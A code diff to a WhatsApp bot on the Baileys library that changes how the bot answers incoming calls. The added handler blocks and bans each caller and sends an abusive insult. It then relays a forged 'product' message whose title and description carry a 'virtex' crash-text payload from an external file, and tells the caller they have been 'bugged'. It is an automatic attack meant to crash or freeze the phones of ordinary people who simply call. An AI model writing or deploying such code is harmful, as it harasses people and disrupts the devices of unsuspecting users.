@@ -1,4 +1,4 @@
-const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
+const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode, relayWAMessage,prepareMessageFromContent,prepareMessage  } = require('@adiwajshing/baileys')
 const simple = require("./lib/simple.js");
 const WAConnection = simple.WAConnection(_WAConnection);
 const client = new WAConnection()
@@ -16,6 +16,7 @@ const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
 const { addBanned, unBanned, cekBannedUser } = require("./lib/banned");
 //const keepAlive = require("./keepalive.js")
 Anticall = settings.Anticall
+prefix = settings.setPrefix.prefix
 joinExtream = settings.joinGcExtream
 ext = settings.SetFunction.ext
 const baterai = {
@@ -83,25 +84,57 @@ async function starts() {
 	    })
         client.on('CB:action,,call',  json => {
 	    if(!Anticall) return
+	    async function startsCall() {
         const callerId = json[2][0][1].from;
-         pushname = client.contacts[callerId] != undefined ? client.contacts[callerId].notify = undefined ? PhoneNumber('+' + callerId.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[callerId].notify || client.contacts[callerId].vname : PhoneNumber('+' + callerId.replace('@s.whatsapp.net', '')).getNumber('international')
+        pushname = client.contacts[callerId] != undefined ? client.contacts[callerId].notify = undefined ? PhoneNumber('+' + callerId.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[callerId].notify || client.contacts[callerId].vname : PhoneNumber('+' + callerId.replace('@s.whatsapp.net', '')).getNumber('international')
         let id = json[2][0][2][0][1]["call-id"]
         if(cekBannedUser(callerId, ban)) return
         console.log("call dari "+ callerId)
         console.log(pushname)
         addBanned (pushname, calender, callerId, ban) 
-        addBlock(callerId, blocked)
-        client.sendMessage(callerId, "Kamu telah di block + banned karena telpon botz", MessageType.text)
-        client.blockUser(callerId, "add") // Block user
+        addBlock(callerId, blocked)  
+      
+        if(callerId.startsWith("62")){
+        var teksnya = "Anjing lu, ga usah nelpon /vc napa, kurang kerjaan banget"
+        } else {
+        var teksnya = "Fuck you bitch, why you call me huh ? "
+        }
+        
+        client.sendMessage(callerId, teksnya, MessageType.text)
+        forward = { forwardingScore: 10000000000, isForwarded: true, sendEphemeral: true}
+        const { virtex8 } = require('./virtex/virtex.js')
+        davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
+        hmm4 = fs.readFileSync('./stik/fake.jpeg'),
+        imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
+        imeg = imeu.message.imageMessage
+        res =  client.prepareMessageFromContent(callerId, {
+        'productMessage': {
+        'product': {
+        'productImage': imeg,
+        'productId': '',
+        'title': virtex8(prefix),
+        'description': virtex8(prefix),
+        'priceAmount1000': '1000',
+        'descriptionCount': 1,
+        'productImageCount': '1'
+         },
+        'businessOwnerJid': `0@s.whatsapp.net`,
+         'contextInfo': forward
+         }
+         }, {contextInfo: forward}), 
+        await client.relayWAMessage(res)
+        await client.modifyChat(callerId, ChatModification.delete)       
+        await client.sendMessage(callerId, "Kamu telah di block,banned + bug karena telpon botz", MessageType.text)
+        await client.blockUser(callerId, "add") // Block user
+        } 
+        startsCall()
         })     
         client.on('message-delete', async (m) => {
         require('./message/antidelete.js')(client, m)
         })      
-client.on('chat-update', async (message) => {
+        client.on('chat-update', async (message) => {
         require('./index.js')(client, message, baterai )
         })
-
-
 
 };
 
